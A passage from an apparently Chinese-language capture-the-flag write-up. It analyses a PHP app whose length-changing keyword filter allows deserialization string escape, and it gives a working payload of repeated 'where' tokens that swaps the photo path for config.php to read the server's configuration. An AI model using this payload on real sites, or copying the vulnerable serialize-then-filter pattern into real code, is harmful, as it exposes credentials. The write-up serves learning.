1000000)</span><br><span class="line">			die(&#x27;Photo size error&#x27;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br><span class="line">		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>看见代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure>
-<p>可知会限制nickname输入的长度，且将输入的信息进行序列化，然后我们再用全局搜索class.php搜索updata_profile()函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p>发现输入的序列化的信息会经过filter()函数进行过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">		$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">		$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;</span><br><span class="line">		$string = preg_replace($escape, &#x27;_&#x27;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">public function update($table, $key, $value, $where) &#123;</span><br><span class="line">		$sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p>这个函数会将输入的select、insert、update、delete、where变为hacker，然后我们再看profile.php文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">		die(&#x27;Login First&#x27;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  == null) &#123;</span><br><span class="line">		header(&#x27;Location: update.php&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这里会将输入信息进行反序列化，并用file_get_contents()函数进行读取photo参数的值，所以我们可以利用反序列化逃逸，但是nickname有长度的限制，所以我们可以利用上面strlen()的漏洞来构造数组绕过，所以我们可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>来读取config.php文件，但是在反序列化的时候，它会按照长度来取值，所以我们可以利用filter中如果输入的是where会替换成hacker，会多出一个字符，所以我们可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>作为输入，不过在本地测试时，发现构造输入时会多出一个;}，可能因为在序列化数组时，不会像字符串一样闭合，所以多出一个;}，但是不影响，因为;}是分隔符，会将后面的字符串忽略掉</p>
 
       
     </div>
